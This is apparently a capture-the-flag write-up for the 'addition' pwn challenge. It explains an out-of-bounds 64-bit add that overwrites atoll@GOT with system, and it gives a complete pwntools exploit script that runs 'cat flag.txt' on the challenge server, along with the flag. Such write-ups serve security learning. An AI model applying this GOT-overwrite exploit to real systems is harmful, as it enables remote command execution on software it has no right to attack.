addition Solution
Category: pwn
Target: nc addition.chal.imaginaryctf.org 1337
Flag: ictf{i_love_finding_offsets_4fd29170cb90}
TL;DR
The program repeatedly asks:
add where?
add what?
and does a 64-bit add at *(buf + where) += what with no bounds check. We can write outside buf and hit the GOT. If we add (system - atoll) to atoll@GOT, the next call to atoll becomes a call to system, with our input string as its argument. Then we send cat flag.txt.
________________________________________
Recon
From reversing (strings/ghidra) the loop is essentially:
while (1) {
  puts("add where?");
  long off = atoll(readline());
  if (off == 1337) break;

  puts("add what?");
  long val = atoll(readline());

  *(long *)((char *)buf + off) += val;   // 64-bit add, no bounds check
}
Key properties:
•	No bounds check → arbitrary 8-byte add into process memory.
•	atoll() is used to parse your inputs each time.
•	PLT/GOT is writable (no RELRO or partial RELRO).
•	The GOT entry for atoll is already resolved when we start interacting, so it holds the real libc address.
________________________________________
Target addresses & math
Using the provided artifacts (vuln, libc.so.6, ld-linux-x86-64.so.2) we get:
1.	libc offsets (exported symbols):
•	system @ 0x0000000000050d60
•	atoll @ 0x0000000000043670
Compute the delta we need to add into the atoll@GOT entry:
•	DELTA = system - atoll = 0x50d60 - 0x43670 = 0x0d6f0 = 55024 (dec)
2.	Binary static addresses (PIE off / fixed region used by the challenge)
•	buf = 0x4069
•	atoll@GOT = 0x4020
Compute the index into the “add where?” pointer space:
•	INDEX = GOT_ATOLL - BUF = 0x4020 - 0x4069 = -0x49 = -73
So the plan is:
1.	Write at offset INDEX = -73.
2.	Add DELTA = 55024 to *(buf + INDEX) → patches atoll@GOT into system.
3.	Next time the binary calls atoll(...), it actually calls system(...) with our input string. Send cat flag.txt.
________________________________________
Exploit (Pwntools)
from pwn import *

HOST, PORT = "addition.chal.imaginaryctf.org", 1337

# Offsets computed from your uploaded libc.so.6
LIBC_SYSTEM = 0x0000000000050d60
LIBC_ATOLL  = 0x0000000000043670
DELTA = LIBC_SYSTEM - LIBC_ATOLL   # 0xd6f0 = 55024

# PIE-relative offsets computed from your binary
BUF      = 0x4069
GOT_ATOLL= 0x4020
INDEX = GOT_ATOLL - BUF            # -73

def solve():
    io = remote(HOST, PORT)
    # 1) point at atoll@GOT
    io.sendlineafter(b"add where?", str(INDEX).encode())
    # 2) add (system - atoll) to GOT entry
    io.sendlineafter(b"add what?", str(DELTA).encode())

    # 3) Now atoll has become system. Next "add where?" calls system(<our string>).
    io.sendlineafter(b"add where?", b"cat flag.txt")
    # The program will try to ask "add what?" again; just read output.
    print(io.recvuntil(b'\n', timeout=2).decode(errors="ignore"))
    print(io.recvrepeat(1).decode(errors="ignore"))
    io.close()

if __name__ == "__main__":
    solve()
Result
ictf{i_love_finding_offsets_4fd29170cb90}
